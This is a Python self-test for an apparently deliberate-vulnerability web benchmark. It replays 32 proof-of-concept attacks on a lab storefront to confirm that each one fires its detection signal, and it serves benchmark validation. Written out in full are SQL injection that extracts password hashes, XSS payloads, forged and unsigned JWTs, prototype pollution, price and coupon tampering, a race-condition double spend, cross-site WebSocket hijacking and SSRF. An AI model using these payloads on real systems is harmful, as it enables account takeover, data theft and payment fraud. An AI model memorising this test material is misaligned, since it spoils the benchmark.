#!/usr/bin/env python3
"""Replay every PoC in the shopfront catalog and assert that each anomaly fires once.

This is what stops the corpus from being decorative. A catalog entry whose PoC no longer
works is worse than no entry at all: every tool loses a point it could never have won,
the published recall is wrong for everyone, and "no tool found it" looks exactly like
"the flaw is hard".

Method
------
Ordinary HTTP with the standard library, because that is what a tool would send. The one
exception is the order stream, which needs a WebSocket handshake and two frames, written
by hand here rather than pulling in a dependency for eleven lines of framing.

Two entries (BENCH-SHOP-0009 and -0010) are proved by a browser reporting a policy
violation, because that is the only evidence that script actually ran rather than that a
string was accepted. They need Playwright. Without it they are reported as SKIPPED and
the run fails, so that a partial result is never mistaken for a green one; pass
--allow-skips if you are knowingly running without a browser.

All traffic comes from the platform network, so the collector marks it synthetic by
source address and none of it is scored. There is no marker header: a header would be
visible to a tool through any reflection or verbose error and would hand it the shape of
the grader.

Usage
-----
    docker compose exec shopfront /usr/local/bin/state-reset
    docker run --rm --network bench-internal -v "$PWD:/w" -w /w python:3.12-alpine \
        python targets/shopfront/selftest.py
    docker compose exec shopfront /usr/local/bin/state-reset

Environment
-----------
    SHOPFRONT_URL          default http://shopfront:3000
    BENCH_COLLECTOR_URL    default http://otel-collector:8900
    SHOPFRONT_CREDENTIALS  default targets/shopfront/bench-credentials.yaml
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import socket
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("SHOPFRONT_URL", "http://shopfront:3000").rstrip("/")
COLLECTOR = os.environ.get("BENCH_COLLECTOR_URL", "http://otel-collector:8900").rstrip("/")
CREDENTIALS = os.environ.get(
    "SHOPFRONT_CREDENTIALS",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "bench-credentials.yaml"),
)
RUN_TAG = format(int(time.time()) % 1000000, "06d")

ALL_IDS = [f"BENCH-SHOP-{n:04d}" for n in range(1, 33)]

# signal -> catalog id. The application never emits an id; this is the mapping the
# scorer applies, restated here so the self-test asserts on the same thing it does.
SIGNALS = {
    "shop.catalog.query.plan_anomaly": "BENCH-SHOP-0001",
    "shop.catalog.sort.expression_fault": "BENCH-SHOP-0002",
    "shop.graph.products.plan_anomaly": "BENCH-SHOP-0003",
    "shop.search.saved.plan_anomaly": "BENCH-SHOP-0004",
    "shop.graph.schema.full_walk": "BENCH-SHOP-0005",
    "shop.graph.batch.amplification": "BENCH-SHOP-0006",
    "shop.reviews.body.markup_persisted": "BENCH-SHOP-0007",
    "shop.support.thread.markup_persisted": "BENCH-SHOP-0008",
    "shop.web.search.script_execution": "BENCH-SHOP-0009",
    "shop.web.account.script_execution": "BENCH-SHOP-0010",
    "shop.admin.coupons.actor_role_mismatch": "BENCH-SHOP-0011",
    "shop.orders.transition.actor_role_mismatch": "BENCH-SHOP-0012",
    "shop.web.cors.credentialed_reflection": "BENCH-SHOP-0013",
    "shop.orders.subject.mismatch": "BENCH-SHOP-0014",
    "shop.support.ticket.subject_mismatch": "BENCH-SHOP-0015",
    "shop.auth.token.unverified_accept": "BENCH-SHOP-0016",
    "shop.auth.token.key_path_escape": "BENCH-SHOP-0017",
    "shop.auth.stepup.unverified_grant": "BENCH-SHOP-0018",
    "shop.auth.login.credential_sweep": "BENCH-SHOP-0019",
    "shop.auth.stepup.code_sweep": "BENCH-SHOP-0020",
    "shop.cart.state.decode_anomaly": "BENCH-SHOP-0021",
    "shop.cart.merge.prototype_write": "BENCH-SHOP-0022",
    "shop.graph.variables.prototype_write": "BENCH-SHOP-0023",
    "shop.checkout.line.price_authority": "BENCH-SHOP-0024",
    "shop.checkout.shipping.rate_authority": "BENCH-SHOP-0025",
    "shop.checkout.line.negative_quantity": "BENCH-SHOP-0026",
    "shop.checkout.total.numeric_overflow": "BENCH-SHOP-0027",
    "shop.checkout.coupon.redemption_excess": "BENCH-SHOP-0028",
    "shop.wallet.redemption.double_spend": "BENCH-SHOP-0029",
    "shop.stream.orders.cross_origin_session": "BENCH-SHOP-0030",
    "shop.imports.fetch.external": "BENCH-SHOP-0031",
    "shop.media.avatar.fetch_external": "BENCH-SHOP-0032",
}

# Confirmed by the sinkhole rather than by a counter in the application: the importer and
# the avatar fetcher discard the body, so the only evidence is the callback. What the
# service emits is the correlation that lets the sinkhole attribute it.
OOB_IDS = {"BENCH-SHOP-0031", "BENCH-SHOP-0032"}
BROWSER_IDS = {"BENCH-SHOP-0009", "BENCH-SHOP-0010"}


# ---------------------------------------------------------------------------
# credentials
# ---------------------------------------------------------------------------

def read_credentials(path: str) -> dict:
    """Read the three identities out of the credentials file.

    Hand-parsed rather than with PyYAML so this runs on a bare python image with no
    install step; the file is a flat list of four scalars per entry and is generated by
    the reset command, so its shape is not going to drift.
    """
    users: dict[str, dict] = {}
    current: dict | None = None
    try:
        with open(path, encoding="utf-8") as handle:
            for line in handle:
                stripped = line.strip()
                match = re.match(r"^-\s+role:\s*(\S+)$", stripped)
                if match:
                    current = {"role": match.group(1)}
                    users[match.group(1)] = current
                    continue
                if current is None:
                    continue
                match = re.match(r"^(username|password|subject_id):\s*(.+)$", stripped)
                if match:
                    value = match.group(2).strip()
                    if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
                        value = value[1:-1]
                    current[match.group(1)] = value
    except OSError as exc:
        raise SystemExit(f"cannot read {path}: {exc}")
    for role in ("user", "other-user", "admin"):
        if role not in users:
            raise SystemExit(f"{path} does not define a {role} identity")
    return users


CREDS = read_credentials(CREDENTIALS)


# ---------------------------------------------------------------------------
# http
# ---------------------------------------------------------------------------

class Client:
    """A cookie jar and a request helper. One instance per identity."""

    def __init__(self) -> None:
        self.cookies: dict[str, str] = {}

    def request(self, method, path, body=None, headers=None, raw=None, content_type="application/json"):
        url = BASE + path
        data = None
        head = dict(headers or {})
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode()
            head["Content-Type"] = content_type
        elif body is not None:
            data = json.dumps(body).encode()
            head["Content-Type"] = content_type
        if self.cookies:
            head["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        head.setdefault("Accept", "application/json")
        head.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) storefront-monitor")
        request = urllib.request.Request(url, data=data, method=method, headers=head)
        try:
            with urllib.request.urlopen(request, timeout=30) as response:
                self._absorb(response)
                return response.status, self._json(response.read())
        except urllib.error.HTTPError as error:
            self._absorb(error)
            return error.code, self._json(error.read())
        except urllib.error.URLError as error:
            raise SystemExit(f"cannot reach {url}: {error}")

    def _absorb(self, response) -> None:
        for value in response.headers.get_all("Set-Cookie") or []:
            name, _, rest = value.partition("=")
            self.cookies[name.strip()] = rest.split(";")[0]

    @staticmethod
    def _json(raw: bytes):
        if not raw:
            return None
        try:
            return json.loads(raw)
        except ValueError:
            return {"_raw": raw[:400].decode("utf-8", "replace")}

    def get(self, path, **kw):
        return self.request("GET", path, **kw)

    def post(self, path, body=None, **kw):
        return self.request("POST", path, body=body, **kw)

    def patch(self, path, body=None, **kw):
        return self.request("PATCH", path, body=body, **kw)

    def put(self, path, body=None, **kw):
        return self.request("PUT", path, body=body, **kw)

    def sign_in(self, role):
        who = CREDS[role]
        status, payload = self.post(
            "/api/auth/login", {"email": who["username"], "password": who["password"]}
        )
        if status != 200:
            raise SystemExit(f"cannot sign in as {role}: {status} {payload}")
        return payload


def api(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    request = urllib.request.Request(
        COLLECTOR + path, data=data, method=method, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        raw = response.read()
    return json.loads(raw) if raw else None


# ---------------------------------------------------------------------------
# helpers shared by several replays
# ---------------------------------------------------------------------------

def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def unsigned_token(subject: str) -> str:
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    claims = b64url(json.dumps({"sub": subject}).encode())
    return f"{header}.{claims}."


def empty_key_token(subject: str, kid: str) -> str:
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid}).encode())
    claims = b64url(json.dumps({"sub": subject}).encode())
    signing_input = f"{header}.{claims}".encode()
    signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{header}.{claims}.{b64url(signature)}"


def stocked_variants(client: Client, count=2):
    """Two variant ids that are on sale, with their catalogue prices."""
    found = []
    status, payload = client.get("/api/products?limit=12")
    if status != 200:
        raise SystemExit(f"cannot read the catalogue: {status} {payload}")
    for product in payload.get("products", []):
        status, detail = client.get(f"/api/products/{product['slug']}")
        if status != 200:
            continue
        for variant in detail.get("variants", []):
            if variant.get("stock", 0) > 5:
                found.append((variant["id"], variant["price_cents"]))
                if len(found) >= count:
                    return found
    raise SystemExit("no variant with stock in the catalogue")


def empty_basket(client: Client):
    status, payload = client.get("/api/cart")
    if status != 200:
        return
    for item in (payload or {}).get("items", []):
        client.request("DELETE", f"/api/cart/items/{item['id']}")


def place_order(client: Client):
    status, payload = client.post("/api/checkout/sessions", {})
    if status != 201:
        raise SystemExit(f"cannot open a checkout: {status} {payload}")
    status, payload = client.post("/api/checkout/confirm", {})
    if status != 201:
        raise SystemExit(f"cannot confirm the checkout: {status} {payload}")
    return payload


# ---------------------------------------------------------------------------
# the replays
# ---------------------------------------------------------------------------

def poc_0001(ctx):
    term = "x' UNION SELECT id,email,password_hash,1,1 FROM users--"
    ctx.anon.get("/api/products?q=" + urllib.parse.quote(term))


def poc_0002(ctx):
    order = "price_asc,CAST((SELECT version()) AS integer)"
    ctx.anon.get("/api/products?sort=" + urllib.parse.quote(order))


def poc_0003(ctx):
    ctx.anon.post(
        "/graphql",
        {
            "query": "query($f: ProductFilter){ products(filter: $f){ id slug title } }",
            "variables": {"f": {"tag": "x' UNION SELECT id,email,password_hash,1,1 FROM users--"}},
        },
    )


def poc_0004(ctx):
    rule = "tag:x' UNION SELECT id,email,password_hash,1,1 FROM users--"
    status, payload = ctx.user.post(
        "/api/account/saved-searches", {"label": f"watch {RUN_TAG}", "rule": rule}
    )
    if status != 201:
        raise SystemExit(f"cannot store a saved search: {status} {payload}")
    ctx.user.get(f"/api/account/saved-searches/{payload['saved_search']['id']}/results")


def poc_0005(ctx):
    ctx.anon.post(
        "/graphql",
        {"query": "{ __schema { types { name fields { name type { name } } } } }"},
    )


def poc_0006(ctx):
    batch = [
        {"query": '{ giftCardBalance(code: "%s"){ cents } }' % f"9{i:03d}-0000-{i:04d}"}
        for i in range(255)
    ]
    batch.append({"query": '{ giftCardBalance(code: "0000-0000-0001"){ cents } }'})
    ctx.anon.post("/graphql", batch)


def poc_0007(ctx):
    product = ctx.first_product_id
    status, payload = ctx.user.post(
        f"/api/products/{product}/reviews",
        {
            "rating": 5,
            "title": "Does the job",
            "body": f"Good buy <img src=x onerror=fetch('/api/status')> run {RUN_TAG}",
        },
    )
    if status != 201:
        raise SystemExit(f"cannot leave a review: {status} {payload}")
    ctx.other.get(f"/api/products/{product}/reviews")


def poc_0008(ctx):
    # A fresh conversation, so that it is at the top of the console's list: the console
    # shows the forty most recent open threads and the seeded ones are older than that.
    status, payload = ctx.user.post(
        "/api/support/tickets",
        {"subject": f"Parcel not delivered {RUN_TAG}", "body": "The tracking stopped on Tuesday."},
    )
    if status != 201:
        raise SystemExit(f"cannot open a conversation: {status} {payload}")
    ticket = payload["ticket"]["id"]
    status, payload = ctx.user.post(
        f"/api/support/tickets/{ticket}/messages",
        {"body": f"Still nothing <img src=x onerror=fetch('/api/status')> ref {RUN_TAG}"},
    )
    if status != 201:
        raise SystemExit(f"cannot reply on a conversation: {status} {payload}")
    ctx.admin.get("/api/admin/support/tickets?status=open")


def poc_0011(ctx):
    ctx.user.post(
        "/api/admin/coupons",
        {"code": f"OFF-{RUN_TAG}", "percent_off": 100, "max_redemptions": 999},
    )


def poc_0012(ctx):
    status, payload = ctx.user.get("/api/orders?limit=50")
    if status != 200:
        raise SystemExit(f"cannot list orders: {status} {payload}")
    staff_only = {
        "placed": "paid",
        "paid": "refunded",
        "picking": "fulfilled",
        "fulfilled": "refunded",
        "returned": "refunded",
    }
    for order in payload.get("orders", []):
        target = staff_only.get(order["state"])
        if not target:
            continue
        status, _ = ctx.user.post(f"/api/orders/{order['id']}/transitions", {"to": target})
        if status == 200:
            return
    raise SystemExit("no order of this customer is in a state a staff-only move applies to")


def poc_0013(ctx):
    ctx.user.get(
        "/api/account/profile",
        headers={"Origin": f"https://{ctx.domain}.attacker.example"},
    )


def poc_0014(ctx):
    ctx.user.get("/api/orders/1002")


def poc_0015(ctx):
    ctx.user.get("/api/support/tickets/7002")


def poc_0016(ctx):
    ctx.anon.get(
        "/api/account/loyalty",
        headers={"Authorization": "Bearer " + unsigned_token("1002")},
    )


def poc_0017(ctx):
    ctx.anon.get(
        "/api/account/loyalty",
        headers={"Authorization": "Bearer " + empty_key_token("1002", "../../../../dev/null")},
    )


def poc_0018(ctx):
    status, payload = ctx.user.post("/api/auth/step-up/requests", {"purpose": "payout"})
    if status != 201:
        raise SystemExit(f"cannot start a step-up: {status} {payload}")
    ctx.user.post("/api/auth/step-up/resend", {"step_up_id": payload["step_up_id"]})


def poc_0019(ctx):
    who = CREDS["user"]["username"]
    for attempt in range(30):
        ctx.sweeper.post("/api/auth/login", {"email": who, "password": f"not-it-{attempt:04d}"})


def poc_0020(ctx):
    status, payload = ctx.user.post("/api/auth/step-up/requests", {"purpose": "payment-method"})
    if status != 201:
        raise SystemExit(f"cannot start a step-up: {status} {payload}")
    step_up_id = payload["step_up_id"]
    for attempt in range(30):
        # Seven digits: the stored code is six, so none of these can be right by accident.
        ctx.user.post("/api/auth/step-up/verify", {"step_up_id": step_up_id, "code": f"1{attempt:06d}"})


def poc_0021(ctx):
    state = {"lines": [], "currency": "EUR", "total": {"$expr": "process.mainModule"}}
    blob = base64.b64encode(json.dumps(state).encode()).decode()
    ctx.anon.post("/api/cart/restore", {"state": blob})


def poc_0022(ctx):
    # Written as raw text: an object literal built in the client would set the object's
    # prototype instead of giving it a key by that name, and the service would never see
    # it. A parser on the other end is what makes the key real.
    key = f"basketRun{RUN_TAG}"
    ctx.user.post("/api/cart/merge", raw='{"meta":{"__proto__":{"%s":true}}}' % key)


def poc_0023(ctx):
    key = f"graphRun{RUN_TAG}"
    ctx.anon.post(
        "/graphql",
        raw=(
            '{"query":"query ProductGrid($first: Int){ products(first: $first){ id } }",'
            '"operationName":"ProductGrid",'
            '"variables":{"first":6,"__proto__":{"%s":true}}}' % key
        ),
    )


def poc_0024(ctx):
    empty_basket(ctx.user)
    variant, _price = ctx.variants[0]
    ctx.user.post("/api/cart/items", {"variant_id": variant, "quantity": 1, "unit_price_cents": 1})
    place_order(ctx.user)


def poc_0025(ctx):
    empty_basket(ctx.user)
    variant, _price = ctx.variants[0]
    ctx.user.post("/api/cart/items", {"variant_id": variant, "quantity": 1})
    status, payload = ctx.user.post("/api/checkout/sessions", {})
    if status != 201:
        raise SystemExit(f"cannot open a checkout: {status} {payload}")
    ctx.user.post("/api/checkout/shipping", {"method": "express", "rate_cents": -4500})
    status, payload = ctx.user.post("/api/checkout/confirm", {})
    if status != 201:
        raise SystemExit(f"cannot confirm the checkout: {status} {payload}")


def poc_0026(ctx):
    empty_basket(ctx.user)
    first, _ = ctx.variants[0]
    second, _ = ctx.variants[1]
    ctx.user.post("/api/cart/items", {"variant_id": first, "quantity": 1})
    ctx.user.post("/api/cart/items", {"variant_id": second, "quantity": -40})
    place_order(ctx.user)


def poc_0027(ctx):
    empty_basket(ctx.user)
    variant, _price = ctx.variants[0]
    status, payload = ctx.user.post("/api/cart/items", {"variant_id": variant, "quantity": 1})
    if status != 201:
        raise SystemExit(f"cannot add to the basket: {status} {payload}")
    item = payload["item"]["id"]
    ctx.user.patch(f"/api/cart/items/{item}", {"quantity": 2147483})
    place_order(ctx.user)


def poc_0028(ctx):
    empty_basket(ctx.user)
    variant, _price = ctx.variants[0]
    ctx.user.post("/api/cart/items", {"variant_id": variant, "quantity": 1})
    status, payload = ctx.user.post("/api/checkout/sessions", {})
    if status != 201:
        raise SystemExit(f"cannot open a checkout: {status} {payload}")
    for _ in range(3):
        ctx.user.post("/api/checkout/coupons", {"code": "WELCOME-ONCE"})
    status, payload = ctx.user.post("/api/checkout/confirm", {})
    if status != 201:
        raise SystemExit(f"cannot confirm the checkout: {status} {payload}")


def poc_0029(ctx):
    results = []

    def redeem():
        client = Client()
        client.cookies = dict(ctx.user.cookies)
        results.append(client.post("/api/gift-cards/redeem", {"code": "4831-2205-7719"}))

    threads = [threading.Thread(target=redeem) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


def poc_0030(ctx):
    host = urllib.parse.urlparse(BASE)
    port = host.port or 80
    key = base64.b64encode(os.urandom(16)).decode()
    cookie = "; ".join(f"{k}={v}" for k, v in ctx.user.cookies.items())
    handshake = (
        f"GET /ws/orders HTTP/1.1\r\n"
        f"Host: {host.hostname}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Origin: https://attacker.example\r\n"
        f"Cookie: {cookie}\r\n"
        f"\r\n"
    ).encode()

    sock = socket.create_connection((host.hostname, port), timeout=15)
    try:
        sock.sendall(handshake)
        buffer = b""
        while b"\r\n\r\n" not in buffer:
            chunk = sock.recv(4096)
            if not chunk:
                raise SystemExit("the order stream refused the upgrade")
            buffer += chunk
        status_line = buffer.split(b"\r\n")[0]
        if b"101" not in status_line:
            raise SystemExit(f"the order stream refused the upgrade: {status_line!r}")
        sock.sendall(text_frame(json.dumps({"type": "subscribe", "scope": "orders"})))
        sock.settimeout(6)
        deadline = time.time() + 6
        while time.time() < deadline:
            try:
                if not sock.recv(65536):
                    break
            except socket.timeout:
                break
    finally:
        sock.close()


def text_frame(text: str) -> bytes:
    """One masked client text frame. Eleven lines, versus a dependency."""
    body = text.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(body))
    header = b"\x81"
    if len(body) < 126:
        header += struct.pack("!B", 0x80 | len(body))
    elif len(body) < (1 << 16):
        header += struct.pack("!BH", 0x80 | 126, len(body))
    else:
        header += struct.pack("!BQ", 0x80 | 127, len(body))
    return header + mask + masked


def poc_0031(ctx):
    host = f"feed{RUN_TAG}.supplier-{RUN_TAG}.example"
    ctx.oob_hosts["BENCH-SHOP-0031"] = host
    ctx.admin.post("/api/admin/imports", {"source_url": f"http://{host}/catalogue.json"})


def poc_0032(ctx):
    host = f"pic{RUN_TAG}.avatar-{RUN_TAG}.example"
    ctx.oob_hosts["BENCH-SHOP-0032"] = host
    ctx.user.post("/api/account/avatar/import", {"image_url": f"http://{host}/a.png"})


def poc_0009(ctx):
    """The crumb parameter, rendered by a real browser."""
    ctx.browser_visit(
        "/search?q=tent&ref=" + urllib.parse.quote("<img src=x onerror=fetch('/api/status')>"),
        session=False,
    )


def poc_0010(ctx):
    """A stored panel title, rendered by a real browser on the account dashboard."""
    status, payload = ctx.user.put(
        "/api/account/preferences",
        {
            "widgets": [
                {"id": "orders", "title": "<img src=x onerror=fetch('/api/status')>", "size": "wide"}
            ]
        },
    )
    if status != 200:
        raise SystemExit(f"cannot save the dashboard: {status} {payload}")
    ctx.browser_visit("/account", session=True)


POCS = [
    ("BENCH-SHOP-0001", poc_0001),
    ("BENCH-SHOP-0002", poc_0002),
    ("BENCH-SHOP-0003", poc_0003),
    ("BENCH-SHOP-0004", poc_0004),
    ("BENCH-SHOP-0005", poc_0005),
    ("BENCH-SHOP-0006", poc_0006),
    ("BENCH-SHOP-0007", poc_0007),
    ("BENCH-SHOP-0008", poc_0008),
    ("BENCH-SHOP-0011", poc_0011),
    ("BENCH-SHOP-0012", poc_0012),
    ("BENCH-SHOP-0013", poc_0013),
    ("BENCH-SHOP-0014", poc_0014),
    ("BENCH-SHOP-0015", poc_0015),
    ("BENCH-SHOP-0016", poc_0016),
    ("BENCH-SHOP-0017", poc_0017),
    ("BENCH-SHOP-0018", poc_0018),
    ("BENCH-SHOP-0021", poc_0021),
    ("BENCH-SHOP-0022", poc_0022),
    ("BENCH-SHOP-0023", poc_0023),
    ("BENCH-SHOP-0024", poc_0024),
    ("BENCH-SHOP-0025", poc_0025),
    ("BENCH-SHOP-0026", poc_0026),
    ("BENCH-SHOP-0027", poc_0027),
    ("BENCH-SHOP-0028", poc_0028),
    ("BENCH-SHOP-0029", poc_0029),
    ("BENCH-SHOP-0030", poc_0030),
    ("BENCH-SHOP-0031", poc_0031),
    ("BENCH-SHOP-0032", poc_0032),
    ("BENCH-SHOP-0009", poc_0009),
    ("BENCH-SHOP-0010", poc_0010),
    # Last: a sweep leaves the account's recent-failure window full, and a successful
    # sign-in clears it, so nothing after this may sign in as that customer again.
    ("BENCH-SHOP-0020", poc_0020),
    ("BENCH-SHOP-0019", poc_0019),
]


class Context:
    def __init__(self, browser):
        self.anon = Client()
        self.user = Client()
        self.other = Client()
        self.admin = Client()
        self.sweeper = Client()
        self.oob_hosts: dict[str, str] = {}
        self._browser = browser

        self.user.sign_in("user")
        self.other.sign_in("other-user")
        self.admin.sign_in("admin")

        status, profile = self.user.get("/api/account/profile")
        if status != 200:
            raise SystemExit(f"cannot read the signed-in profile: {status} {profile}")
        self.domain = profile["customer"]["email"].split("@")[1]

        status, listing = self.anon.get("/api/products?limit=1")
        self.first_product_id = listing["products"][0]["id"]
        self.variants = stocked_variants(self.anon, 2)

    def browser_visit(self, path, session):
        if self._browser is None:
            raise RuntimeError("no browser")
        self._browser(path, self.user.cookies if session else {})


def make_browser():
    """A Playwright page visit, or None when Playwright is not installed."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return None, None

    manager = sync_playwright().start()
    browser = manager.chromium.launch(args=["--no-sandbox"])

    def visit(path, cookies):
        context = browser.new_context(base_url=BASE)
        if cookies:
            host = urllib.parse.urlparse(BASE).hostname
            context.add_cookies(
                [
                    {"name": k, "value": v, "domain": host, "path": "/"}
                    for k, v in cookies.items()
                ]
            )
        page = context.new_page()
        page.goto(BASE + path, wait_until="networkidle")
        page.wait_for_timeout(1500)
        context.close()

    def shutdown():
        browser.close()
        manager.stop()

    return visit, shutdown


def main() -> int:
    allow_skips = "--allow-skips" in sys.argv
    no_browser = "--no-browser" in sys.argv
    replay_only = "--no-collector" in sys.argv

    visit, shutdown = (None, None) if no_browser else make_browser()
    if visit is None and not no_browser:
        print("Playwright is not installed; the two rendered entries cannot be replayed.",
              file=sys.stderr)

    run_id = None
    if not replay_only:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "shopfront-poc-replay",
                "targets": ["shopfront"],
                "notes": "targets/shopfront/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as error:
            print(f"cannot reach the collector at {COLLECTOR}: {error}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    skipped: list[str] = []
    ctx = None
    try:
        ctx = Context(visit)
        for vuln_id, replay in POCS:
            print(f"  replaying {vuln_id} ... ", end="", flush=True)
            if vuln_id in BROWSER_IDS and visit is None:
                skipped.append(vuln_id)
                print("SKIPPED (no browser)")
                continue
            try:
                replay(ctx)
                print("sent")
            except SystemExit as error:
                print(f"FAILED to send: {error}")
            except OSError as error:
                print(f"FAILED to send: {error}")
    finally:
        if shutdown:
            shutdown()

    if replay_only:
        print("replay done (no assertions)")
        return 0

    # The counters are queued by the SDK and flushed on a short interval; the collector
    # writes them from its own queue. Both are sub-second, so this is generous.
    print("waiting 5s for the collector to settle ...")
    time.sleep(5)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    evidence: dict[str, str] = {}
    correlations: dict[str, int] = {}
    callbacks: set[str] = set()

    for event in events:
        body = event.get("payload") if isinstance(event.get("payload"), dict) else event
        kind = body.get("type") or event.get("type")
        signal = body.get("signal")
        if kind in ("signal", "trigger") and signal:
            vuln_id = SIGNALS.get(signal)
            if not vuln_id:
                counts[f"?{signal}"] = counts.get(f"?{signal}", 0) + 1
                continue
            counts[vuln_id] = counts.get(vuln_id, 0) + 1
            detail = (body.get("attributes") or body.get("evidence") or {}).get("detail")
            if detail and vuln_id not in evidence:
                evidence[vuln_id] = detail
        elif kind == "correlation" and signal:
            vuln_id = SIGNALS.get(signal)
            if vuln_id:
                correlations[vuln_id] = correlations.get(vuln_id, 0) + 1
        elif kind == "oob":
            raw = json.dumps(body)
            for vuln_id, host in (ctx.oob_hosts if ctx else {}).items():
                if host in raw:
                    callbacks.add(vuln_id)

    print()
    failures = []
    for vuln_id in ALL_IDS:
        if vuln_id in skipped:
            print(f"SKIP {vuln_id}  not replayed")
            failures.append((vuln_id, "skipped"))
            continue
        if vuln_id in OOB_IDS:
            registered = correlations.get(vuln_id, 0)
            mark = "ok  " if registered == 1 else "FAIL"
            seen = " callback seen" if vuln_id in callbacks else " callback not observed here"
            print(f"{mark} {vuln_id}  correlations={registered}{seen}")
            if registered != 1:
                failures.append((vuln_id, f"correlations={registered}"))
            continue
        n = counts.get(vuln_id, 0)
        mark = "ok  " if n == 1 else "FAIL"
        print(f"{mark} {vuln_id}  signals={n}")
        if vuln_id in evidence:
            print(f"       {evidence[vuln_id][:280]}")
        if n != 1:
            failures.append((vuln_id, f"signals={n}"))

    stray = sorted(k for k in counts if k.startswith("?"))
    for name in stray:
        print(f"FAIL {name}  a counter no catalog entry claims ({counts[name]})")
        failures.append((name, counts[name]))

    print()
    if allow_skips:
        failures = [f for f in failures if f[1] != "skipped"]
    if failures:
        print(f"{len(failures)} of {len(ALL_IDS)} entries did not fire exactly once")
        print("A count of 0 means the flaw was repaired, the PoC no longer matches the "
              "application, or the state was not reset before this run.")
        print("A count above 1 means a counter is firing on traffic that does not prove "
              "exploitation, which would hand tools free points.")
        return 1

    print(f"all {len(ALL_IDS)} shopfront entries fired exactly once")
    print("run /usr/local/bin/state-reset before the next run: this replay places orders, "
          "redeems a gift card and moves an order through its states.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
